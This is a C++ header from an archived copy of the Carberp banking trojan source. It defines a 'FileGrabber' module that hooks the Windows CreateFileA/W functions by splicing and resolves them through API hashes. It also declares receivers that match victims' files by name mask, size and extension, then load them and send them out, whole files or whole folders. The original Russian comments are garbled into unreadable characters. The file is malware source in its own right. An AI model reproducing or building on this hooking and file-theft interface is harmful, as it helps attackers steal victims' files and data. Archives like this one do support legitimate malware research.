/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
������������� ������� ������, �������������� ��� ������ ��������� ����� �� CreateFile
*/

#ifndef FileGrabberH
#define FileGrabberH

#include <windows.h>
#include "Splice.h"

namespace FileGrabber {

	struct ParamEvent
	{
		union
		{
			WCHAR fileNameW[MAX_PATH];
			char fileNameA[MAX_PATH];
		};
		char* fileName; //��� ����� � ansi, ���� �������� � unicode, �� ��� ����� � ansi (������������� ��������������)
		const char* shortName; //��� ����� ��� ����
		const char* extFile; //���������� �����
		bool unicode; //true - ����� �� CreateFileW, false - CreateFileA
		BYTE* data; //���������� �����
		int szData; //������ �����, ������ ����� ���� � � ���������� ����� ������ � data
		DWORD access; ////GENERIC_READ + GENERIC_WRITE
		HANDLE file;
		char nameSend[MAX_PATH]; //��� ����� ������ ���������� ����, ����������� �����������, �� ��������� FileGrabber
	};

	typedef int (*TypeFuncReceiver)( ParamEvent* ); //��� ������� ������� ����� ���������� ����������

	//����� ����������
	const int CREATEFILEA = 0x0001;
	const int CREATEFILEW = 0x0002;
	const int LOADFILE = 0x0004; //��������� ���� (����� � ParamEvent.data), �� ���� ���� �����, �� ��������� � ����� ������
	const int SENDFILE = 0x0008; //���������� ����������, ���� ���� ����� ��������� � ������� (���� �����)
	const int FILEISBIN = 0x0010; //�������� ����� �� ����������� (��������� ����� ����)
	const int CURRNAMEFILE = 0x0020; //���������� ����������, ���������� � ������� � ������ ����� ���������� � CreateFile (��� ����)
	const int FILEISBASE64 = 0x0040; //�������� ����� �� ���������� ��������� base64
	const int CURRFULLNAMEFILE = 0x0080; //���������� ����������, ���������� � ������� � ������ ����� ���������� � CreateFile � ������ �����
	const int SENDFOLDER = 0x0100; //�������� ����� � ������� ��������� ��������� ����, ��� ����� ��� ��������� ������� � nameSend
	const int IGNOREHOOK = 0x0200; //���������� ��������� ����
	const int INHOOK = 0x0400; //���� ��������� ����, ��� ��������� ����� ������������ �� ��� �����
	const int STOPRECEIVER = 0x0800; //��������� ���������� (���������� ���� �� ����� ������ �� ���� �����������)

	const int MaxIgnoreBeg = 4; //������������ ���������� ������������ ��������
	const int MaxLenIgnoreBeg = 4; //������������ ����� ����� �������

	//���������� � ������� ��������� � ����� � ������� CreateFile
	struct Receiver
	{
		int id;
		int minSize, maxSize; //����������� � ������������ ������ �����, ���� maxSize < 0, �� ���� ������ minSize
		char* maska; //��� ������ ��������� � �����
		DWORD access; //GENERIC_READ + GENERIC_WRITE, �� ��������� �������� GENERIC_READ
		int aw; //CREATEFILEA - ������ ��� CreateFileA, CREATEFILEW - ������ ��� CreateFileW
		TypeFuncReceiver FuncReceiver; //������� ���������� �������
		char ignoreBeg[MaxIgnoreBeg][MaxLenIgnoreBeg]; //������������� ������ ������������ ��������, � ������� � ������ ����� ������� ���� ����� (� ������ ����������� �����, ��� �������, ��������)
							  //������ �������� �� 4-� �������, ����� ������� ��������� ������ ������ (ignoreBeg[n][0] == 0)
		DWORD* ignoreExt; //������������ ����������
		DWORD* neededExt; //������ ����������
		bool ignore; //true - ���� ����� ������������ ����� ����������
	};

	typedef HANDLE (WINAPI *TypeCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess,
										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
										  HANDLE hTemplateFile);
	typedef HANDLE (WINAPI *TypeCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess,
										  DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,
										  DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes,
										  HANDLE hTemplateFile);

	const int Hash_CreateFileA = 0x8F8F114;
	const int Hash_CreateFileW = 0x8F8F102;

	extern TypeCreateFileW Real_CreateFileW;
	extern TypeCreateFileA Real_CreateFileA;

	extern PList receivers; //����������

	//������������� � ��������� �����
	bool Init( int flags = CREATEFILEA | CREATEFILEW ); 
	//����������� ������ ����������� � �������� ����� 
	void Release();

	Receiver* CreateReceiver();
	bool AddReceiver( Receiver* );
	bool AddIgnoreBeg( Receiver*, const char* ); //��������� ������������ ������� ������, ������� ����������� � ������ �����
	bool AddIgnoreExt( Receiver*, const DWORD* ); //��������� ������ ����� ������������ ���������� ������, ������ ������������� �����
	bool AddNeededExt( Receiver*, const DWORD* ); //��������� ������ ����� ������ ��� ���������� ������, ������ ������������� �����
};

#endif //FileGrabberH
